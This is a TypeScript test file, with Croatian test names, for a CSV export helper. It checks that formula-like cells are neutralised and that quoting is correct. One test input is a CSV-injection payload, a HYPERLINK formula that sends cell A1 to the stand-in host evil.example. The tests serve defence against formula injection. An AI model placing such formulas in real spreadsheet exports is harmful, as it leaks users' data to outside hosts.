import { describe, expect, it } from "vitest";
import { csvResponse } from "./csv";

const body = async (rows: Record<string, unknown>[]) => (await csvResponse(rows, "x.csv").text()).replace(/^﻿/, "").split("\n");

describe("csvResponse", () => {
  it("upis igrača koji počinje kao formula ostaje tekst", async () => {
    const lines = await body([
      { raw: '=HYPERLINK("https://evil.example/?"&A1,"klik")' },
      { raw: "+385" },
      { raw: "-2+3" },
      { raw: "@SUM(A1)" },
      { raw: "Krk" },
    ]);
    expect(lines).toEqual(["raw", `"'=HYPERLINK(""https://evil.example/?""&A1,""klik"")"`, "'+385", "'-2+3", "'@SUM(A1)", "Krk"]);
  });

  it("brojevi i datumi se ne diraju", async () => {
    const lines = await body([{ km: -5, at: new Date("2026-10-27T10:00:00Z"), ok: true }]);
    expect(lines[1]).toBe("-5,2026-10-27T10:00:00.000Z,true");
  });

  it("navodnici, zarezi i novi redovi su u navodnicima", async () => {
    const lines = await body([{ raw: 'a,"b"\r\nc' }]);
    expect(lines.slice(1).join("\n")).toBe('"a,""b""\r\nc"');
  });
});
